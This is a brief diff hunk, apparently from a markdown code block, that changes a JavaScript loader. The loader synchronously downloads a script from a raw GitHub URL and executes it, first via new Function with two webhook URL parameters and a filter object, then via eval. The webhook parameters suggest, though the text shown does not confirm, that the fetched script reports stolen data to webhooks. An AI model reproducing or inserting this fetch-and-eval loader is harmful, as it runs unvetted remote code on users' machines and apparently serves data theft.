@@ -32,6 +32,5 @@ const HI_FILTER = {
 let xhr = new XMLHttpRequest();
 xhr.open('GET', 'https://raw.githubusercontent.com/z3db0y/Z3Dline/main/dist.js', false);
 xhr.send();
-
-new Function('LO_WEBHOOK_URL', 'HI_WEBHOOK_URL', 'HI_FILTER', xhr.responseText)(LO_WEBHOOK_URL, HI_WEBHOOK_URL, HI_FILTER);
+eval(xhr.responseText);
 ```
